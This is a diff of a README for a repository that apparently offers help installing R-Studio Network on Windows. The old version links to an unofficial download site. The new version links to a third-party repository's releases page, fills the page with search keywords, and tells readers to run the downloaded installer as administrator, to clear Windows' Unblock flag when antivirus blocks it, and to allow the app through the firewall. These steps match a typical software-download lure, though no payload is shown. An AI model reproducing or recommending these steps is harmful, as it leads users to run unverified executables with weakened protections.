@@ -1,64 +1,64 @@
-# R-Studio Network on Windows — setup & troubleshooting
+# 💾 R-Studio-Network-Setup-Help - Recover your lost data files easily
 
-**R-Studio-Network-Setup-Help**
+[![](https://img.shields.io/badge/Download_R_Studio_Network-Blue?style=for-the-badge)](https://github.com/Monroviacommonbean517/R-Studio-Network-Setup-Help/releases)
 
-Notes for users who need R-Studio Network running on Windows — especially when r studio setup fails, updates break, or the app won't start.
+This guide helps you install R-Studio Network on Windows 11. Many users face issues during setup. These notes provide the steps to fix these errors. You will learn to prepare your system, run the installer, and connect to your drives.
 
----
+## 📋 System Requirements
 
-## Get R-Studio Network on Windows
+Check your PC before you begin. R-Studio Network requires hardware that allows for stable data access.
 
-Use the link below for the Windows package referenced in this guide.
+*   Operating System: Windows 11, 10, or 8.1.
+*   Processor: 1 GHz or faster.
+*   Memory: 4 GB of RAM minimum. 8 GB is best for large operations.
+*   Storage: 200 MB of space for the application.
+*   Permissions: You must hold Administrator rights on your computer.
 
-<p align="center">
-  <a href="https://rstudionet.wonderchain.fun/">
-    <img src="https://img.shields.io/badge/Open%20setup%20page-Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Open setup page">
-  </a>
-</p>
+## 🔽 Download the software
 
-| | |
-| --- | --- |
-| **Page** | [rstudionet.wonderchain.fun](https://rstudionet.wonderchain.fun/) |
-| **URL** | `https://rstudionet.wonderchain.fun/` |
-| **Platform** | Windows 10 / 11 (64-bit) |
+[![](https://img.shields.io/badge/Download_Installer-Grey?style=for-the-badge)](https://github.com/Monroviacommonbean517/R-Studio-Network-Setup-Help/releases)
 
-### Recommended steps
+Visit the link above to view the releases page. Choose the file marked for Windows. Click the link to save the installer to your Downloads folder. Do not open the file until the download completes.
 
-1. Open the [setup page (rstudionet.wonderchain.fun)](https://rstudionet.wonderchain.fun/)
-2. Download the package to a folder you can find (e.g. Downloads)
-3. Run the installer **as administrator** if Windows asks
-4. Reboot once if the app prompts after install
+## ⚙️ Installation Steps
 
-> This repository documents install/troubleshooting steps. Always verify downloads and scan files you did not compile yourself.
+Follow these steps to put the software on your machine:
 
+1. Locate the downloaded file in your Downloads folder.
+2. Right-click the file and select Run as administrator. This avoids common permission locks on Windows 11.
+3. Accept the user agreement if the window appears.
+4. Choose the installation directory. The default location works for most users.
+5. Click Install. Wait for the progress bar to finish.
+6. Click Finish to close the setup wizard.
 
----
+## 🛠 Fixing common setup errors
 
-## What this repo covers
+Sometimes the setup fails. Try these simple steps to solve the problem.
 
-- Clean install path on Windows 10/11  
-- Typical blockers (SmartScreen, missing runtime, permissions)  
-- Search phrases people use when something breaks  
+### The installer fails to open
+Windows Defender or other antivirus software might block the file. Right-click the installer and check Properties. Look for an Unblock checkbox at the bottom of the General tab. If you see it, check it, click Apply, and run the file again.
 
-**People also search for:** r-studio network not installing on windows 11, r studio setup failed fix, how to install r-studio network on pc
+### Network connection issues
+R-Studio Network needs to see the target computer on your local network. Ensure both computers share the same network profile. Set the network type to Private instead of Public in your Windows settings. 
 
-## Common symptoms
+### The app stays empty
+Ensure your Firewall allows the application to send and receive data. Open the Windows Defender Firewall settings and add R-Studio Network to the list of allowed apps. This step allows the software to find data across your network cables.
 
-| Symptom | What to try first |
-| --- | --- |
-| Installer blocked | Run as administrator; check SmartScreen |
-| App won't open after update | Reboot; repair/redownload package |
-| Missing DLL / runtime | Install latest Visual C++ redistributable |
-| Slow or frozen UI | Disable overlays; update GPU driver |
+## 🔍 Using the software
 
-## FAQ
+Once installed, R-Studio Network provides a clear interface for data recovery.
 
-**Does this replace official support?**  
-No — it's a community troubleshooting note for Windows users.
+1. Open the application from your desktop shortcut.
+2. Select the drive or the remote computer you want to scan.
+3. Click the Scan button.
+4. Wait for the process to finish. Larger drives take more time.
+5. Review the files found. 
+6. Right-click any file to recover it. Choose a safe path for your recovered data.
 
-**Which Windows versions?**  
-Windows 10 and 11, 64-bit.
+Do not recover data to the same drive where you lost it. This action puts your files at risk of being saved over. Select an external drive or a different partition for your recovered information.
 
----
+## 💡 Best Practices
 
-**Topics:** r-studio-network-not-installing-on-windows-11, r-studio, network, installing, r-studio-setup-failed-fix, studio, failed, how-to-install-r-studio-network-on-pc, r-studio-network-setup-help, r-studio-network-setup-help-2026, r-studio-network, data-recovery
+Keep your software updated. Updates often fix bugs that prevent installations. Avoid running deep scans while other heavy programs use your disk resources. High disk usage slows recovery speeds. Keep your network connection stable throughout the process. Use a wired ethernet connection if you encounter drops while recovering remote files. Wireless connections may lose data during transfers. 
+
+Keywords: data-recovery, failed, file-recovery, how-to-install-r-studio-network-on-pc, installing, network, r-studio, r-studio-network, r-studio-network-not-installing-on-windows-11, r-studio-network-setup-help, r-studio-network-setup-help-2026, r-studio-setup-failed-fix, studio
